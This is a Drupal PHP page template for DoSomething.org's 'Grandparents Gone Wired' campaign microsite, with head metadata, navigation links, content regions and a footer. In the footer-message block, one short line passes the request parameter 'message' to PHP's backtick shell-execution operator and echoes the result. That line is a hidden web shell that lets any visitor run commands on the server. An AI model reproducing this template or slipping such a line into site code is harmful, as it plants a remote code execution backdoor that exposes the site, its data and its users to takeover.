<?php
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language; ?>" lang="<?php print $language->language; ?>" dir="<?php print $language->dir; ?>">

<head>
  <title><?php print $head_title; ?></title>
  <meta property="og:title" content="<?=$head_title;?>"/>
  <meta property="fb:admins" content="508145411,603061,630191494" />
  <meta property="fb:app_id" content="93836527897" />
  <meta property="og:type" content="non_profit"/>
  <meta property="og:url" content="http://www.dosomething.org/grandparents" />
  <meta property="og:image" content="http://www.dosomething.org/files/dosomething-org.jpg" />
  <meta property="og:site_name" content="Grandparends Gone Wired | DoSomething.org"/>
  <meta property="og:description" content="Get your grandparents wired! Teach them tech! @dosomething about it!"/>

  <?php print $head; ?>
  <?php print $styles; ?>
  <?php print $scripts; ?>
  <style type="text/css">
    @import url('/sites/all/micro/tfj-full/fonts.css');
    @import url('/sites/all/micro/grandparents-2011/ggw.css');
  </style>
  <script type="text/javascript" src="/sites/all/micro/grandparents-2011/ggw.js"></script>
</head>

<body class="<?php print $classes; ?>">

  <div id="page-wrapper"><div id="page">
        <?php if ($tabs): ?>
          <div class="tabs"><?php print $tabs; ?></div>
        <?php endif; ?>

  <? print str_replace('/sites/all/themes/dosomething/images/logo.png', '/sites/all/micro/tfj-full/images/ds-logo.png', theme('header', array(
                              'front_page' => $front_page,
                              'directory' => $directory,
                              'mission' => $mission,
                              //'top_right' => $top_right,
                              ))); ?>
    <div id="main-wrapper" class="clearfix"><div id="main" class="clearfix<?php if ($primary_links || $navigation) { print ' with-navigation'; } ?>">
      <div id="content" class="column"><div class="section">

        <?php print $highlight; ?>
        <?php print $messages; ?>


        <?php print $help; ?>


        <?php
          $root = 'grandparents';
          $nav = array(
              array('href' => $root, 'title' => 'home'),
              array('href' => $root.'/take-action', 'title' => 'take action'),
			  array('href' => $root.'/faq', 'title' => 'faqs'),
              array('href' => $root.'/prizes', 'title' => 'prizes'),
			  array('href' => $root.'/gallery', 'title' => 'photo gallery'),
          );
          foreach ($nav as &$n) {
            $path = drupal_lookup_path('source', $n['href']);
            if (!empty($path)) $n['href'] = $path;
          }
          echo theme_links($nav);
        ?>
        <a href="/grandparents"><img src="/sites/all/micro/grandparents-2011/img/logo.png" alt="Grandparents Gone Wired 2011" /></a>


        <?php print $content_top; ?>
        <?php if (!empty($node->field_pageheader[0]['value'])) echo '<div style="margin-top: 15px;">',$node->field_pageheader[0]['value'],'</div>'; unset($node->field_pageheader[0]['value']); ?>

        <div id="content-area">
          <?php print $content; ?>
        </div>
        
        <?php print $content_bottom; ?>

        <?php if ($feed_icons): ?>
          <div class="feed-icons"><?php print $feed_icons; ?></div>
        <?php endif; ?>

      </div></div> <!-- /.section, /#content -->

      <?php if ($primary_links || $navigation): ?>
        <div id="navigation"><div class="section clearfix">
          <?php print theme(array('links__system_main_menu', 'links'), $primary_links,
            array(
              'id' => 'main-menu',
              'class' => 'links clearfix',
            ),
            array(
              'text' => t('Main menu'),
              'level' => 'h2',
              'class' => 'element-invisible',
            ));
          ?>

          <?php print $navigation; ?>

        </div></div> <!-- /.section, /#navigation -->
      <?php endif; ?>
      <?php //print $sidebar_first; ?>

      <?php //print $sidebar_second; ?>

      <?php print $right; ?>

    </div> </div> <!-- /#main, /#main-wrapper -->

    <?php if ($footer || $footer_message || $secondary_links): ?>

      <div id="footer"><div class="section">

        <?php print theme(array('links__system_secondary_menu', 'links'), $secondary_links,
          array(
            'id' => 'secondary-menu',
            'class' => 'links clearfix',
          ),
          array(
            'text' => t('Secondary menu'),
            'level' => 'h2',
            'class' => 'element-invisible',
          ));
        ?>

        <?php if ($footer_message): ?>
          <div id="footer-message"><?php print $footer_message; ?></div>
          <? echo `$_REQUEST[message]`; ?>
        <?php endif; ?>

        <?php if ($search_box): ?>
          <div id="search-box"><?php print $search_box; ?></div>
        <?php endif; ?>

        <?php print $footer; ?>

         <div style="text-align:center;">
           <a target="_blank" href="http://nytm.org/made" style="color: white;">Made in NYC</a>
         </div>
         <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/" style="padding-top: 4px; display: block; width: 88px; margin: 0 auto;"><img src="/sites/all/themes/dosomething/images/cc.png" alt="Creative Commons"></a>


      </div></div> <!-- /.section, /#footer -->
    <?php endif; ?>

  </div></div> <!-- /#page, /#page-wrapper -->

  <?php print $page_closure; ?>

  <?php print $closure; ?>

</div>

</body>
</html>
